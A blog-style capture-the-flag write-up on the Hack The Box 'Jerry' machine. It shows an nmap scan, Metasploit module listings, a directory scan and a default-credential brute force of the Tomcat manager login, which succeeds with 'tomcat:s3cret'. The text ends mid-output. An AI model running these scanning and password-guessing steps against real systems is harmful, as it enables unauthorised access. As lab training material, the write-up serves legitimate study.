---
layout: post
title:  "Hacking the Hack The Box Jerry Machine"
author: RaviTeja
categories: [ Pentesting ]
image: assets/images/Jerry.jpg
---
### Hello every one!
#### In this post i will walk you through the process in which i have rooted Jerry Machine on Hack The Box. Basically it is a simple machine and dont require much effort in rooting.<br><br>

#### I started with a nmap scan as shown below along with the results.<br><br>

```
nmap -T4 -p- -Pn -A 10.10.10.95
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-25 13:14 IST
Nmap scan report for 10.10.10.95
Host is up (0.051s latency).
Not shown: 65534 filtered ports
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-favicon: Apache Tomcat
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat/7.0.88

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 97.91 seconds
```
#### It is clear that apache server is hosted on port 8080 except that we are not able to get any details. <br><br>
#### Let's check what are all directories present on the server with dir search on msfconsole as shown below. <br><br> 
```
msf6 > search auxiliary http dir

Matching Modules
================

   #    Name                                                            Disclosure Date  Rank       Check  Description
   -    ----                                                            ---------------  ----       -----  -----------
   0    auxiliary/scanner/http/a10networks_ax_directory_traversal       2014-01-28       normal     No     A10 Networks AX Loadbalancer Directory Traversal
   1    auxiliary/scanner/http/accellion_fta_statecode_file_read        2015-07-10       normal     No     Accellion FTA 'statecode' Cookie Arbitrary File Read
   2    auxiliary/server/android_mercury_parseuri                                        normal     No     Android Mercury Browser Intent URI Scheme and Directory Traversal Vulnerability
   3    auxiliary/scanner/http/apache_userdir_enum                                       normal     No     Apache "mod_userdir" User Enumeration
   4    auxiliary/scanner/http/apache_activemq_traversal                                 normal     No     Apache ActiveMQ Directory Traversal
   5    auxiliary/scanner/http/apache_flink_jobmanager_traversal        2021-01-05       normal     Yes    Apache Flink JobManager Traversal
   6    auxiliary/parser/unattend                                                        normal     No     Auxilliary Parser Windows Unattend Passwords
   7    auxiliary/admin/http/axigen_file_access                         2012-10-31       normal     No     Axigen Arbitrary File Read and Delete
   8    auxiliary/scanner/http/barracuda_directory_traversal            2010-10-08       normal     No     Barracuda Multiple Product "locale" Directory Traversal
   9    auxiliary/scanner/http/bitweaver_overlay_type_traversal         2012-10-23       normal     No     Bitweaver overlay_type Directory Traversal
   10   auxiliary/scanner/chargen/chargen_probe                         1996-02-08       normal     No     Chargen Probe Utility
   11   auxiliary/scanner/http/cisco_directory_traversal                2018-06-06       normal     No     Cisco ASA Directory Traversal
   12   auxiliary/scanner/http/cisco_firepower_download                 2016-10-10       normal     No     Cisco Firepower Management Console 6.0 Post Auth Report Download Directory Traversal
   13   auxiliary/scanner/http/cisco_nac_manager_traversal                               normal     No     Cisco Network Access Manager Directory Traversal Vulnerability
   14   auxiliary/scanner/http/citrix_dir_traversal                     2019-12-17       normal     No     Citrix ADC (NetScaler) Directory Traversal Scanner
   15   auxiliary/scanner/http/clansphere_traversal                     2012-10-23       normal     No     ClanSphere 2011.3 Local File Inclusion Vulnerability
   16   auxiliary/scanner/http/coldfusion_locale_traversal                               normal     No     ColdFusion Server Check
   17   auxiliary/scanner/ftp/colorado_ftp_traversal                    2016-08-11       normal     Yes    ColoradoFTP Server 1.3 Build 8 Directory Traversal Information Disclosure
   18   auxiliary/admin/http/dlink_dir_645_password_extractor                            normal     No     D-Link DIR 645 Password Extractor
   19   auxiliary/scanner/http/dlink_dir_300_615_http_login                              normal     No     D-Link DIR-300A / DIR-320 / DIR-615D HTTP Login Utility
   20   auxiliary/scanner/http/dlink_dir_session_cgi_http_login                          normal     No     D-Link DIR-300B / DIR-600B / DIR-815 / DIR-645 HTTP Login Utility
   21   auxiliary/admin/http/dlink_dir_300_600_exec_noauth              2013-02-04       normal     No     D-Link DIR-600 / DIR-300 Unauthenticated Remote Command Execution
   22   auxiliary/scanner/http/dlink_dir_615h_http_login                                 normal     No     D-Link DIR-615H HTTP Login Utility
   23   auxiliary/scanner/http/dlink_user_agent_backdoor                2013-10-12       normal     No     D-Link User-Agent Backdoor Scanner
   24   auxiliary/scanner/smb/impacket/secretsdump                                       normal     No     DCOM Exec
   25   auxiliary/scanner/http/dicoogle_traversal                       2018-07-11       normal     No     Dicoogle PACS Web Server Directory Traversal
   26   auxiliary/scanner/http/directadmin_login                                         normal     No     DirectAdmin Web Control Panel Login Utility
   27   auxiliary/scanner/http/springcloud_directory_traversal          2020-06-01       normal     No     Directory Traversal in Spring Cloud Config Server
   28   auxiliary/scanner/http/dnalims_file_retrieve                    2017-03-08       normal     No     DnaLIMS Directory Traversal
   29   auxiliary/gather/doliwamp_traversal_creds                       2014-01-12       normal     Yes    DoliWamp 'jqueryFileTree.php' Traversal Gather Credentials
   30   auxiliary/scanner/http/drupal_views_user_enum                   2010-07-02       normal     Yes    Drupal Views Module Users Enumeration
   31   auxiliary/scanner/http/elasticsearch_traversal                                   normal     Yes    ElasticSearch Snapshot API Directory Traversal
   32   auxiliary/scanner/http/goahead_traversal                                         normal     No     Embedthis GoAhead Embedded Web Server Directory Traversal
   33   auxiliary/dos/http/f5_bigip_apm_max_sessions                                     normal     No     F5 BigIP Access Policy Manager Session Exhaustion Denial of Service
   34   auxiliary/admin/scada/ge_proficy_substitute_traversal           2013-01-22       normal     No     GE Proficy Cimplicity WebView substitute.bcl Directory Traversal
   35   auxiliary/scanner/http/http_traversal                                            normal     No     Generic HTTP Directory Traversal Utility
   36   auxiliary/scanner/http/gitlab_user_enum                         2014-11-21       normal     No     GitLab User Enumeration
   37   auxiliary/scanner/http/hp_imc_bims_downloadservlet_traversal                     normal     No     HP Intelligent Management BIMS DownloadServlet Directory Traversal
   38   auxiliary/scanner/http/hp_imc_faultdownloadservlet_traversal                     normal     No     HP Intelligent Management FaultDownloadServlet Directory Traversal
   39   auxiliary/scanner/http/hp_imc_ictdownloadservlet_traversal                       normal     No     HP Intelligent Management IctDownloadServlet Directory Traversal
   40   auxiliary/scanner/http/hp_imc_reportimgservlt_traversal                          normal     No     HP Intelligent Management ReportImgServlt Directory Traversal
   41   auxiliary/server/browser_autopwn2                               2015-07-05       normal     No     HTTP Client Automatic Exploiter 2 (Browser Autopwn)
   42   auxiliary/gather/browser_info                                   2016-03-22       normal     No     HTTP Client Information Gather
   43   auxiliary/scanner/http/brute_dirs                                                normal     No     HTTP Directory Brute Force Scanner
   44   auxiliary/scanner/http/dir_listing                                               normal     No     HTTP Directory Listing Scanner
   45   auxiliary/scanner/http/dir_scanner                                               normal     No     HTTP Directory Scanner
   46   auxiliary/scanner/http/file_same_name_dir                                        normal     No     HTTP File Same Name Directory Scanner
   47   auxiliary/scanner/http/files_dir                                                 normal     No     HTTP Interesting File Scanner
   48   auxiliary/scanner/http/lucky_punch                                               normal     No     HTTP Microsoft SQL Injection Table XSS Infection
   49   auxiliary/scanner/http/prev_dir_same_name_file                                   normal     No     HTTP Previous Directory File Scanner
   50   auxiliary/scanner/http/svn_scanner                                               normal     No     HTTP Subversion Scanner
   51   auxiliary/client/hwbridge/connect                                                normal     No     Hardware Bridge Session Connector
   52   auxiliary/scanner/http/ntlm_info_enumeration                                     normal     No     Host Information Enumeration via NTLM Authentication
   53   auxiliary/scanner/http/httpdasm_directory_traversal                              normal     No     Httpdasm Directory Traversal
   54   auxiliary/scanner/ipmi/ipmi_dumphashes                          2013-06-20       normal     No     IPMI 2.0 RAKP Remote SHA1 Password Hash Retrieval
   55   auxiliary/scanner/scada/indusoft_ntwebserver_fileaccess                          normal     No     Indusoft WebStudio NTWebServer Remote File Access
   56   auxiliary/admin/http/intersil_pass_reset                        2007-09-10       normal     Yes    Intersil (Boa) HTTPd Basic Authentication Password Reset
   57   auxiliary/scanner/tftp/ipswitch_whatsupgold_tftp                2011-12-12       normal     No     IpSwitch WhatsUp Gold TFTP Directory Traversal
   58   auxiliary/admin/http/kaseya_master_admin                        2015-09-23       normal     No     Kaseya VSA Master Administrator Account Creation
   59   auxiliary/scanner/http/kodi_traversal                           2017-02-12       normal     No     Kodi 17.0 Local File Inclusion Vulnerability
   60   auxiliary/scanner/ftp/konica_ftp_traversal                      2015-09-22       normal     Yes    Konica Minolta FTP Utility 1.00 Directory Traversal Information Disclosure
   61   auxiliary/scanner/scada/koyo_login                              2012-01-19       normal     No     Koyo DirectLogic PLC Password Brute Force Utility
   62   auxiliary/scanner/http/linksys_e1500_traversal                                   normal     No     Linksys E1500 Directory Traversal Vulnerability
   63   auxiliary/scanner/rsync/modules_list                                             normal     No     List Rsync Modules
   64   auxiliary/scanner/http/dir_webdav_unicode_bypass                                 normal     No     MS09-020 IIS6 WebDAV Unicode Auth Bypass Directory Scanner
   65   auxiliary/admin/http/iis_auth_bypass                            2010-07-02       normal     No     MS10-065 Microsoft IIS 5 NTFS Stream Authentication Bypass
   66   auxiliary/scanner/mysql/mysql_writable_dirs                                      normal     No     MYSQL Directory Write Test
   67   auxiliary/scanner/mysql/mysql_file_enum                                          normal     No     MYSQL File/Directory Enumerator
   68   auxiliary/gather/safari_file_url_navigation                     2014-01-16       normal     No     Mac OS X Safari file:// Redirection Sandbox Escape
   69   auxiliary/scanner/http/majordomo2_directory_traversal           2011-03-08       normal     No     Majordomo2 _list_file_get() Directory Traversal
   70   auxiliary/scanner/http/manageengine_deviceexpert_traversal      2012-03-18       normal     No     ManageEngine DeviceExpert 5.6 ScheduleResultViewer FileName Traversal
   71   auxiliary/admin/http/manageengine_dir_listing                   2015-01-28       normal     No     ManageEngine Multiple Products Arbitrary Directory Listing
   72   auxiliary/admin/http/manageengine_file_download                 2015-01-28       normal     No     ManageEngine Multiple Products Arbitrary File Download
   73   auxiliary/scanner/http/manageengine_securitymanager_traversal   2012-10-19       normal     No     ManageEngine SecurityManager Plus 5.5 Directory Traversal
   74   auxiliary/scanner/http/support_center_plus_directory_traversal  2014-01-28       normal     No     ManageEngine Support Center Plus Directory Traversal
   75   auxiliary/scanner/http/exchange_web_server_pushsubscription     2019-01-21       normal     No     Microsoft Exchange Privilege Escalation Exploit
   76   auxiliary/dos/windows/ftp/iis_list_exhaustion                   2009-09-03       normal     No     Microsoft IIS FTP Server LIST Stack Exhaustion
   77   auxiliary/scanner/http/iis_internal_ip                                           normal     No     Microsoft IIS HTTP Internal IP Disclosure
   78   auxiliary/admin/mssql/mssql_ntlm_stealer                                         normal     No     Microsoft SQL Server NTLM Stealer
   79   auxiliary/admin/mssql/mssql_ntlm_stealer_sqli                                    normal     No     Microsoft SQL Server SQLi NTLM Stealer
   80   auxiliary/gather/mikrotik_winbox_fileread                       2018-08-02       normal     No     Mikrotik Winbox Arbitrary File Read
   81   auxiliary/admin/scada/moxa_credentials_recovery                 2015-07-28       normal     Yes    Moxa Device Credential Retrieval
   82   auxiliary/scanner/scada/moxa_discover                                            normal     No     Moxa UDP Device Discovery
   83   auxiliary/admin/http/mutiny_frontend_read_delete                2013-05-15       normal     No     Mutiny 5 Arbitrary File Read and Delete
   84   auxiliary/scanner/http/novell_file_reporter_fsfui_fileaccess    2012-11-16       normal     No     NFR Agent FSFUI Record Arbitrary Remote File Access
   85   auxiliary/spoof/nbns/nbns_response                                               normal     No     NetBIOS Name Service Spoofer
   86   auxiliary/scanner/http/netdecision_traversal                    2012-03-07       normal     No     NetDecision NOCVision Server Directory Traversal
   87   auxiliary/scanner/http/netgear_sph200d_traversal                                 normal     No     Netgear SPH200D Directory Traversal Vulnerability
   88   auxiliary/admin/dcerpc/cve_2020_1472_zerologon                                   normal     Yes    Netlogon Weak Cryptographic Authentication
   89   auxiliary/scanner/http/groupwise_agents_http_traversal                           normal     No     Novell Groupwise Agents HTTP Directory Traversal
   90   auxiliary/scanner/misc/zenworks_preboot_fileaccess                               normal     No     Novell ZENworks Configuration Management Preboot Service Remote File Access
   91   auxiliary/gather/nuuo_cms_file_download                         2018-10-11       normal     No     Nuuo Central Management Server Authenticated Arbitrary File Download
   92   exploit/windows/nuuo/nuuo_cms_fu                                2018-10-11       manual     No     Nuuo Central Management Server Authenticated Arbitrary File Upload
   93   auxiliary/sqli/openemr/openemr_sqli_dump                        2019-05-17       normal     Yes    OpenEMR 5.0.1 Patch 6 SQLi Dump
   94   auxiliary/gather/oats_downloadservlet_traversal                 2019-04-16       normal     Yes    Oracle Application Testing Suite Post-Auth DownloadServlet Directory Traversal
   95   auxiliary/scanner/http/glassfish_traversal                      2015-08-08       normal     No     Path Traversal in Oracle GlassFish Server Open Source Edition
   96   auxiliary/dos/windows/http/pi3web_isapi                         2008-11-13       normal     No     Pi3Web ISAPI DoS
   97   auxiliary/admin/http/pfadmin_set_protected_alias                2017-02-03       normal     Yes    Postfixadmin Protected Alias Deletion Vulnerability
   98   auxiliary/scanner/printer/printer_list_dir                                       normal     No     Printer Directory Listing Scanner
   99   auxiliary/admin/smb/psexec_ntdsgrab                                              normal     No     PsExec NTDS.dit And SYSTEM Hive Download Utility
   100  auxiliary/gather/pulse_secure_file_disclosure                   2019-04-24       normal     No     Pulse Secure VPN Arbitrary File Disclosure
   101  auxiliary/scanner/http/rips_traversal                                            normal     No     RIPS Scanner Directory Traversal
   102  auxiliary/scanner/http/radware_appdirector_enum                                  normal     No     Radware AppDirector Bruteforce Login Utility
   103  auxiliary/scanner/redis/file_upload                             2015-11-11       normal     No     Redis File Upload
   104  auxiliary/scanner/http/s40_traversal                            2011-04-07       normal     No     S40 0.4.2 CMS Directory Traversal Vulnerability
   105  auxiliary/dos/sap/sap_soap_rfc_eps_delete_file                                   normal     No     SAP SOAP EPS_DELETE_FILE File Deletion
   106  auxiliary/scanner/sap/sap_soap_rfc_eps_get_directory_listing                     normal     No     SAP SOAP RFC EPS_GET_DIRECTORY_LISTING Directories Information Disclosure
   107  auxiliary/scanner/sap/sap_soap_rfc_rzl_read_dir                                  normal     No     SAP SOAP RFC RZL_READ_DIR_LOCAL Directory Contents Listing
   108  auxiliary/scanner/sap/sap_web_gui_brute_login                                    normal     No     SAP Web GUI Login Brute Forcer
   109  auxiliary/server/socks_unc                                                       normal     No     SOCKS Proxy UNC Path Redirection
   110  auxiliary/admin/smb/samba_symlink_traversal                                      normal     No     Samba Symlink Directory Traversal
   111  auxiliary/gather/samsung_browser_sop_bypass                     2017-11-08       normal     No     Samsung Internet Browser SOP Bypass
   112  auxiliary/admin/scada/modicon_stux_transfer                     2012-04-05       normal     No     Schneider Modicon Ladder Logic Upload/Download
   113  auxiliary/scanner/scada/sielco_winlog_fileaccess                                 normal     No     Sielco Sistemi Winlog Remote File Access
   114  auxiliary/scanner/http/simple_webserver_traversal               2013-01-03       normal     No     Simple Web Server 2.3-RC1 Directory Traversal
   115  auxiliary/scanner/http/sockso_traversal                         2012-03-14       normal     No     Sockso Music Host Server 1.5 Directory Traversal
   116  auxiliary/admin/sunrpc/solaris_kcms_readfile                    2003-01-22       normal     No     Solaris KCMS + TTDB Arbitrary File Read
   117  auxiliary/admin/http/sophos_wpa_traversal                       2013-04-03       normal     No     Sophos Web Protection Appliance patience.cgi Directory Traversal
   118  auxiliary/scanner/http/springcloud_traversal                    2019-04-17       normal     No     Spring Cloud Config Server Directory Traversal
   119  auxiliary/scanner/http/smt_ipmi_url_redirect_traversal          2013-11-06       normal     No     Supermicro Onboard IPMI url_redirect.cgi Authenticated Directory Traversal
   120  auxiliary/scanner/http/surgenews_user_creds                     2017-06-16       normal     Yes    SurgeNews User Credentials
   121  auxiliary/scanner/http/sybase_easerver_traversal                2011-05-25       normal     No     Sybase Easerver 6.3 Directory Traversal
   122  auxiliary/scanner/http/symantec_brightmail_logfile              2012-11-30       normal     No     Symantec Messaging Gateway 9.5 Log File Download Vulnerability
   123  exploit/multi/http/sysaid_auth_file_upload                      2015-06-03       excellent  Yes    SysAid Help Desk Administrator Portal Arbitrary File Upload
   124  auxiliary/admin/http/sysaid_file_download                       2015-06-03       normal     No     SysAid Help Desk Arbitrary File Download
   125  auxiliary/admin/tftp/tftp_transfer_util                                          normal     No     TFTP File Transfer Utility
   126  auxiliary/scanner/http/tplink_traversal_noauth                                   normal     No     TP-Link Wireless Lite N Access Point Directory Traversal Vulnerability
   127  auxiliary/scanner/http/tvt_nvms_traversal                       2019-12-12       normal     No     TVT NVMS-1000 Directory Traversal
   128  auxiliary/server/teamviewer_uri_smb_redirect                                     normal     No     TeamViewer Unquoted URI Handler SMB Redirect
   129  auxiliary/scanner/http/thinvnc_traversal                        2019-10-16       normal     No     ThinVNC Directory Traversal
   130  auxiliary/scanner/http/titan_ftp_admin_pwd                                       normal     No     Titan FTP Administrative Password Disclosure
   131  auxiliary/scanner/ftp/titanftp_xcrc_traversal                   2010-06-15       normal     No     Titan FTP XCRC Directory Traversal Information Disclosure
   132  auxiliary/admin/http/tomcat_utf8_traversal                      2009-01-09       normal     No     Tomcat UTF-8 Directory Traversal Vulnerability
   133  auxiliary/scanner/http/totaljs_traversal                        2019-02-18       normal     Yes    Total.js prior to 3.2.4 Directory Traversal
   134  auxiliary/admin/http/trendmicro_dlp_traversal                   2009-01-09       normal     No     TrendMicro Data Loss Prevention 5.5 Directory Traversal
   135  auxiliary/admin/officescan/tmlisten_traversal                                    normal     No     TrendMicro OfficeScanNT Listener Traversal Arbitrary File Access
   136  auxiliary/admin/http/ulterius_file_download                                      normal     No     Ulterius Server File Download Vulnerability
   137  auxiliary/scanner/vmware/vmware_update_manager_traversal        2011-11-21       normal     No     VMWare Update Manager 4 Directory Traversal
   138  auxiliary/scanner/vmware/vmware_server_dir_trav                                  normal     No     VMware Server Directory Traversal Vulnerability
   139  auxiliary/admin/ldap/vmware_vcenter_vmdir_auth_bypass           2020-04-09       normal     Yes    VMware vCenter Server vmdir Authentication Bypass
   140  auxiliary/gather/vmware_vcenter_vmdir_ldap                      2020-04-09       normal     No     VMware vCenter Server vmdir Information Disclosure
   141  auxiliary/admin/backupexec/dump                                                  normal     No     Veritas Backup Exec Windows Remote File Access
   142  auxiliary/scanner/http/wangkongbao_traversal                                     normal     No     WANGKONGBAO CNS-1000 and 1100 UTM Directory Traversal
   143  auxiliary/admin/http/webnms_file_download                       2016-07-04       normal     No     WebNMS Framework Server Arbitrary Text File Download
   144  auxiliary/scanner/http/webpagetest_traversal                    2012-07-13       normal     No     WebPageTest Directory Traversal
   145  auxiliary/admin/webmin/edit_html_fileaccess                     2012-09-06       normal     No     Webmin edit_html.cgi file Parameter Traversal Arbitrary File Access
   146  auxiliary/scanner/http/wildfly_traversal                        2014-10-22       normal     No     WildFly Directory Traversal
   147  auxiliary/scanner/http/wp_dukapress_file_read                                    normal     No     WordPress DukaPress Plugin File Read Vulnerability
   148  auxiliary/scanner/http/wp_duplicator_file_read                  2020-02-19       normal     No     WordPress Duplicator File Read Vulnerability
   149  auxiliary/scanner/http/wp_easy_wp_smtp                          2020-12-06       normal     No     WordPress Easy WP SMTP Password Reset
   150  auxiliary/scanner/http/wp_gimedia_library_file_read                              normal     No     WordPress GI-Media Library Plugin Directory Traversal Vulnerability
   151  auxiliary/scanner/http/wp_mobileedition_file_read                                normal     No     WordPress Mobile Edition File Read Vulnerability
   152  auxiliary/scanner/http/wp_nextgen_galley_file_read                               normal     No     WordPress NextGEN Gallery Directory Read Vulnerability
   153  auxiliary/scanner/http/wp_simple_backup_file_read                                normal     No     WordPress Simple Backup File Read Vulnerability
   154  auxiliary/scanner/http/wp_subscribe_comments_file_read                           normal     No     WordPress Subscribe Comments File Read Vulnerability
   155  auxiliary/dos/http/wordpress_directory_traversal_dos                             normal     No     WordPress Traversal Directory DoS
   156  auxiliary/gather/xbmc_traversal                                 2012-11-04       normal     No     XBMC Web Server Directory Traversal
   157  auxiliary/scanner/http/yaws_traversal                           2011-11-25       normal     No     Yaws Web Server Directory Traversal
   158  auxiliary/scanner/http/zenload_balancer_traversal               2020-04-10       normal     No     Zen Load Balancer Directory Traversal
   159  auxiliary/scanner/http/cgit_traversal                           2018-08-03       normal     No     cgit Directory Traversal


Interact with a module by name or index. For example info 159, use 159 or use auxiliary/scanner/http/cgit_traversal

msf6 > use 45
msf6 auxiliary(scanner/http/dir_scanner) > options

Module options (auxiliary/scanner/http/dir_scanner):

   Name        Current Setting                                          Required  Description
   ----        ---------------                                          --------  -----------
   DICTIONARY  /usr/share/metasploit-framework/data/wmap/wmap_dirs.txt  no        Path of word dictionary to use
   PATH        /                                                        yes       The path  to identify files
   Proxies                                                              no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                                                               yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT       80                                                       yes       The target port (TCP)
   SSL         false                                                    no        Negotiate SSL/TLS for outgoing connections
   THREADS     1                                                        yes       The number of concurrent threads (max one per host)
   VHOST                                                                no        HTTP server virtual host

msf6 auxiliary(scanner/http/dir_scanner) > set rhosts 10.10.10.95
rhosts => 10.10.10.95
msf6 auxiliary(scanner/http/dir_scanner) > set rport 8080
rport => 8080
msf6 auxiliary(scanner/http/dir_scanner) > run

[*] Detecting error code
[*] Using code '404' as not found for 10.10.10.95
[+] Found http://10.10.10.95:8080/[SecCheck]/ 400 (10.10.10.95)
[+] Found http://10.10.10.95:8080/docs/ 200 (10.10.10.95)
[+] Found http://10.10.10.95:8080/examples/ 200 (10.10.10.95)
[+] Found http://10.10.10.95:8080/manager/ 302 (10.10.10.95)
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
#### We can see that there is manager directory if we try to access it we are requested to get authenticate. We will check this with default username and passwords of tomcat using auxilary module as shown below.

```
msf6> search tomcat

Matching Modules
================

   #   Name                                                         Disclosure Date  Rank       Check  Description
   -   ----                                                         ---------------  ----       -----  -----------
   0   auxiliary/dos/http/apache_commons_fileupload_dos             2014-02-06       normal     No     Apache Commons FileUpload and Apache Tomcat DoS
   1   exploit/multi/http/struts_dev_mode                           2012-01-06       excellent  Yes    Apache Struts 2 Developer Mode OGNL Execution
   2   exploit/multi/http/struts2_namespace_ognl                    2018-08-22       excellent  Yes    Apache Struts 2 Namespace Redirect OGNL Injection
   3   exploit/multi/http/struts_code_exec_classloader              2014-03-06       manual     No     Apache Struts ClassLoader Manipulation Remote Code Execution
   4   exploit/windows/http/tomcat_cgi_cmdlineargs                  2019-04-10       excellent  Yes    Apache Tomcat CGIServlet enableCmdLineArguments Vulnerability
   5   exploit/multi/http/tomcat_mgr_deploy                         2009-11-09       excellent  Yes    Apache Tomcat Manager Application Deployer Authenticated Code Execution
   6   exploit/multi/http/tomcat_mgr_upload                         2009-11-09       excellent  Yes    Apache Tomcat Manager Authenticated Upload Code Execution
   7   auxiliary/dos/http/apache_tomcat_transfer_encoding           2010-07-09       normal     No     Apache Tomcat Transfer-Encoding Information Disclosure and DoS
   8   auxiliary/scanner/http/tomcat_enum                                            normal     No     Apache Tomcat User Enumeration
   9   exploit/windows/http/cayin_xpost_sql_rce                     2020-06-04       excellent  Yes    Cayin xPost wayfinder_seqid SQLi to RCE
   10  exploit/multi/http/cisco_dcnm_upload_2019                    2019-06-26       excellent  Yes    Cisco Data Center Network Manager Unauthenticated Remote Code Execution
   11  exploit/linux/http/cpi_tararchive_upload                     2019-05-15       excellent  Yes    Cisco Prime Infrastructure Health Monitor TarArchive Directory Traversal Vulnerability
   12  exploit/linux/http/cisco_prime_inf_rce                       2018-10-04       excellent  Yes    Cisco Prime Infrastructure Unauthenticated Remote Code Execution
   13  post/multi/gather/tomcat_gather                                               normal     No     Gather Tomcat Credentials
   14  auxiliary/admin/http/tomcat_ghostcat                         2020-02-20       normal     No     Ghostcat
   15  auxiliary/dos/http/hashcollision_dos                         2011-12-28       normal     No     Hashtable Collisions
   16  auxiliary/admin/http/ibm_drm_download                        2020-04-21       normal     Yes    IBM Data Risk Manager Arbitrary File Download
   17  exploit/multi/http/zenworks_configuration_management_upload  2015-04-07       excellent  Yes    Novell ZENworks Configuration Management Arbitrary File Upload
   18  auxiliary/admin/http/tomcat_administration                                    normal     No     Tomcat Administration Tool Default Access
   19  auxiliary/scanner/http/tomcat_mgr_login                                       normal     No     Tomcat Application Manager Login Utility
   20  exploit/multi/http/tomcat_jsp_upload_bypass                  2017-10-03       excellent  Yes    Tomcat RCE via JSP Upload Bypass
   21  auxiliary/admin/http/tomcat_utf8_traversal                   2009-01-09       normal     No     Tomcat UTF-8 Directory Traversal Vulnerability
   22  auxiliary/admin/http/trendmicro_dlp_traversal                2009-01-09       normal     No     TrendMicro Data Loss Prevention 5.5 Directory Traversal
   23  post/windows/gather/enum_tomcat                                               normal     No     Windows Gather Apache Tomcat Enumeration


Interact with a module by name or index. For example info 23, use 23 or use post/windows/gather/enum_tomcat

```
#### By using 19 module we can check for default username and passwords as shown below <br><br>

```
msf6 auxiliary(scanner/http/tomcat_mgr_login) > options

Module options (auxiliary/scanner/http/tomcat_mgr_login):

   Name              Current Setting                                            Required  Description
   ----              ---------------                                            --------  -----------
   BLANK_PASSWORDS   false                                                      no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                                                          yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS      false                                                      no        Try each user/password couple stored in the current database
   DB_ALL_PASS       false                                                      no        Add all passwords in the current database to the list
   DB_ALL_USERS      false                                                      no        Add all users in the current database to the list
   PASSWORD                                                                     no        The HTTP password to specify for authentication
   PASS_FILE         /usr/share/metasploit-framework/data/wordlists/tomcat_mgr  no        File containing passwords, one per line
                     _default_pass.txt
   Proxies                                                                      no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                                                                       yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT             8080                                                       yes       The target port (TCP)
   SSL               false                                                      no        Negotiate SSL/TLS for outgoing connections
   STOP_ON_SUCCESS   false                                                      yes       Stop guessing when a credential works for a host
   TARGETURI         /manager/html                                              yes       URI for Manager login. Default is /manager/html
   THREADS           1                                                          yes       The number of concurrent threads (max one per host)
   USERNAME                                                                     no        The HTTP username to specify for authentication
   USERPASS_FILE     /usr/share/metasploit-framework/data/wordlists/tomcat_mgr  no        File containing users and passwords separated by space, one pair per line
                     _default_userpass.txt
   USER_AS_PASS      false                                                      no        Try the username as the password for all users
   USER_FILE         /usr/share/metasploit-framework/data/wordlists/tomcat_mgr  no        File containing users, one per line
                     _default_users.txt
   VERBOSE           true                                                       yes       Whether to print output for all attempts
   VHOST                                                                        no        HTTP server virtual host

msf6 auxiliary(scanner/http/tomcat_mgr_login) > set rhosts 10.10.10.95
rhosts => 10.10.10.95
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set rport 8080
rport => 8080
msf6 auxiliary(scanner/http/tomcat_mgr_login) > run

[!] No active DB -- Credential data will not be saved!
[-] 10.10.10.95:8080 - LOGIN FAILED: admin:admin (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: admin:manager (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: admin:role1 (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: admin:root (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: admin:tomcat (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: admin:s3cret (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: admin:vagrant (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: manager:admin (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: manager:manager (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: manager:role1 (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: manager:root (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: manager:tomcat (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: manager:s3cret (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: manager:vagrant (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: role1:admin (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: role1:manager (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: role1:role1 (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: role1:root (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: role1:tomcat (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: role1:s3cret (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: role1:vagrant (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: root:admin (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: root:manager (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: root:role1 (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: root:root (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: root:tomcat (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: root:s3cret (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: root:vagrant (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: tomcat:admin (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: tomcat:manager (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: tomcat:role1 (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: tomcat:root (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: tomcat:tomcat (Incorrect)
[+] 10.10.10.95:8080 - Login Successful: tomcat:s3cret
[-] 10.10.10.95:8080 - LOGIN FAILED: both:admin (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: both:manager (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: both:role1 (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: both:root (Incorrect)
